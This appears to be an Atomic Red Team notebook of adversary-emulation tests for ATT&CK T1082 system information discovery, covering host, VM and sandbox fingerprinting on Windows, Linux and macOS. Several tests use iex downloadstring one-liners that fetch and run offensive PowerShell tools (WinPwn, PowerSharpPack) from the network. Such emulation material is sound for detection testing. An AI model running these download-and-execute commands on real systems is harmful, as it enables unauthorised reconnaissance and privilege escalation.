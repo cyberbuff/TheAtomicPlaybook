{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "050e7263",
   "metadata": {},
   "source": "# T1082 - System Information Discovery\nAn adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)"
  },
  {
   "cell_type": "markdown",
   "id": "2364e0e2",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "ac16d91b",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - System Information Discovery",
    "Identify System Info. Upon execution, system info and time info will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsysteminfo\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7c3c282d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "edc8af23",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - System Information Discovery",
    "Identify System Info\n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsystem_profiler\nls -al /Applications\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9007ed30",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "565d52af",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - List OS Information",
    "Identify System Info\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nuname -a >> /tmp/T1082.txt\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> /tmp/T1082.txt; fi\nuptime >> /tmp/T1082.txt\ncat /tmp/T1082.txt 2>/dev/null\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d47d6f43",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "e87af019",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm /tmp/T1082.txt 2>/dev/null\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1007c244",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d808de4f",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Linux VM Check via Hardware",
    "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nif [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi\nif [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi\nif [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi\nif [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi\nif [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi\nif [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi\nif [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "12d6ee9e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "69fefd40",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Linux VM Check via Kernel Modules",
    "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsudo lsmod | grep -i \"vboxsf\\|vboxguest\"\nsudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"\nsudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"\nsudo lsmod | grep -i \"virtio_pci\\|virtio_net\"\nsudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "072dc3f7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "747f47fd",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - FreeBSD VM Check via Kernel Modules",
    "Identify virtual machine host kernel modules.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nkldstat | grep -i \"vmm\"\nkldstat | grep -i \"vbox\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "08754263",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "eede9831",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Hostname Discovery (Windows)",
    "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nhostname\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "798925fe",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "c08aba85",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Hostname Discovery",
    "Identify system hostname for FreeBSD, Linux and macOS systems.\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nhostname\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ee943c3f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "845b4172",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Windows MachineGUID Discovery",
    "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fa03bdd6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "ca871b44",
   "metadata": {},
   "source": "### Atomic Test #10 - Griffon Recon\nThis script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Sample script file must exist on disk at specified location (#{vbscript})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1082/src/griffon_recon.vbs\" -OutFile \"PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "da45849f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "82be6b13",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncscript \"PathToAtomicsFolder\\T1082\\src\\griffon_recon.vbs\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9d71ec8e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "988b52fe",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Environment variables discovery on windows",
    "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nset\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4a48f0dd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "85eee451",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Environment variables discovery on freebsd, macos and linux",
    "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
    "**Supported Platforms:** linux, macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nenv\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "22b35fce",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "c3a32693",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Show System Integrity Protection status (MacOS)",
    "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncsrutil status\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "782c0454",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "036a7b6d",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - WinPwn - winPEAS",
    "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwinPEAS -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4edd6dc8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "e56ebf98",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - WinPwn - itm4nprivesc",
    "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nitm4nprivesc -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f17f131",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "9256d310",
   "metadata": {},
   "source": [
    "### Atomic Test #16 - WinPwn - Powersploits privesc checks",
    "Powersploits privesc checks using oldchecks function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\noldchecks -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0cf67549",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "fde4156d",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nrm -force -recurse .\\DomainRecon -ErrorAction Ignore\nrm -force -recurse .\\Exploitation -ErrorAction Ignore\nrm -force -recurse .\\LocalPrivEsc -ErrorAction Ignore\nrm -force -recurse .\\LocalRecon -ErrorAction Ignore\nrm -force -recurse .\\Vulnerabilities -ErrorAction Ignore```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "80f66691",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 16 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a4fd6d46",
   "metadata": {},
   "source": [
    "### Atomic Test #17 - WinPwn - General privesc checks",
    "General privesc checks using the otherchecks function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\notherchecks -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c252b545",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "f8baa835",
   "metadata": {},
   "source": [
    "### Atomic Test #18 - WinPwn - GeneralRecon",
    "Collect general computer informations via GeneralRecon function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGeneralrecon -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "799aa9ed",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 18"
  },
  {
   "cell_type": "markdown",
   "id": "e41bc0e4",
   "metadata": {},
   "source": [
    "### Atomic Test #19 - WinPwn - Morerecon",
    "Gathers local system information using the Morerecon function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nMorerecon -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bf829a07",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 19"
  },
  {
   "cell_type": "markdown",
   "id": "67162e93",
   "metadata": {},
   "source": [
    "### Atomic Test #20 - WinPwn - RBCD-Check",
    "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nRBCD-Check -consoleoutput -noninteractive```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e66203a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 20"
  },
  {
   "cell_type": "markdown",
   "id": "73539db3",
   "metadata": {},
   "source": [
    "### Atomic Test #21 - WinPwn - PowerSharpPack - Watson searching for missing windows patches",
    "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')\nInvoke-watson```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "78f2ecee",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 21"
  },
  {
   "cell_type": "markdown",
   "id": "e21a9a8a",
   "metadata": {},
   "source": [
    "### Atomic Test #22 - WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors",
    "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1')\nInvoke-SharpUp -command \"audit\"```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9334dcfd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 22"
  },
  {
   "cell_type": "markdown",
   "id": "4578f303",
   "metadata": {},
   "source": [
    "### Atomic Test #23 - WinPwn - PowerSharpPack - Seatbelt",
    "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1')\nInvoke-Seatbelt -Command \"-group=all\"; pause```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4ce85f5d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 23"
  },
  {
   "cell_type": "markdown",
   "id": "bec2e38e",
   "metadata": {},
   "source": "### Atomic Test #24 - Azure Security Scan with SkyArk\nUpon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n\n**Supported Platforms:** azure-ad\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: The SkyArk AzureStealth module must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ninvoke-webrequest \"https://raw.githubusercontent.com/cyberark/SkyArk/3293ee145e95061a8980dd7b5da0030edc4da5c0/AzureStealth/AzureStealth.ps1\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\"\n\n```\n##### Description: The AzureAD module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name AzureAD -Force\n\n```\n##### Description: The Az module must be installed.\n\n##### Check Prereq Commands:\n```powershell\ntry {if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInstall-Module -Name Az -Force\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f31180f3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 24 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d7152355",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\" -force      \n$Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password\nConnect-AzAccount -Credential $Credential\nConnect-AzureAD -Credential $Credential\nScan-AzureAdmins -UseCurrentCred\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4aba6fc3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 24"
  },
  {
   "cell_type": "markdown",
   "id": "c486aaf8",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\n$resultstime = Get-Date -Format \"yyyyMMdd\"\n$resultsfolder = (\"Results-\" + $resultstime)\nremove-item $env:temp\\$resultsfolder -recurse -force -erroraction silentlycontinue\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9818b733",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 24 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "08fd6996",
   "metadata": {},
   "source": [
    "### Atomic Test #25 - Linux List Kernel Modules",
    "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nlsmod\nkmod list\ngrep vmw /proc/modules\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "01dca245",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 25"
  },
  {
   "cell_type": "markdown",
   "id": "c340b18c",
   "metadata": {},
   "source": [
    "### Atomic Test #26 - FreeBSD List Kernel Modules",
    "Enumerate kernel modules loaded. Upon successful execution stdout will display kernel modules loaded, followed by list of modules matching 'vmm' if present.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nkldstat\nkldstat | grep vmm\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "499eeb56",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 26"
  },
  {
   "cell_type": "markdown",
   "id": "36e5ed53",
   "metadata": {},
   "source": [
    "### Atomic Test #27 - System Information Discovery with WMIC",
    "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwmic cpu get name\nwmic MEMPHYSICAL get MaxCapacity\nwmic baseboard get product\nwmic baseboard get version\nwmic bios get SMBIOSBIOSVersion\nwmic path win32_VideoController get name\nwmic path win32_VideoController get DriverVersion\nwmic path win32_VideoController get VideoModeDescription\nwmic OS get Caption,OSArchitecture,Version\nwmic DISKDRIVE get Caption\nGet-WmiObject win32_bios\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3988bae2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 27"
  },
  {
   "cell_type": "markdown",
   "id": "99e7e43f",
   "metadata": {},
   "source": [
    "### Atomic Test #28 - Driver Enumeration using DriverQuery",
    "Executes the driverquery command to list drivers installed on the system. Adversaries utilize the feature to enumerate the driver and it can be\nused for Exploitation. \ncommand /v - provide verbose output but not valid for signed drivers\n        /si - provide information about signed drivers \n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ndriverquery /v\ndriverquery /si\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cee1ec12",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 28"
  },
  {
   "cell_type": "markdown",
   "id": "fdc20728",
   "metadata": {},
   "source": [
    "### Atomic Test #29 - System Information Discovery",
    "The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\\Windows\\System32\\config or c:\\Windows\\System32\\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nwscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8ce007f2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 29"
  },
  {
   "cell_type": "markdown",
   "id": "7d72938d",
   "metadata": {},
   "source": [
    "### Atomic Test #30 - Check computer location",
    "Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8e8d5d94",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 30"
  },
  {
   "cell_type": "markdown",
   "id": "dc5c8c2c",
   "metadata": {},
   "source": [
    "### Atomic Test #31 - BIOS Information Discovery through Registry",
    "Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n- https://evasions.checkpoint.com/techniques/registry.html\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a9842200",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1082 -TestNumbers 31"
  },
  {
   "cell_type": "markdown",
   "id": "9a5c51df",
   "metadata": {},
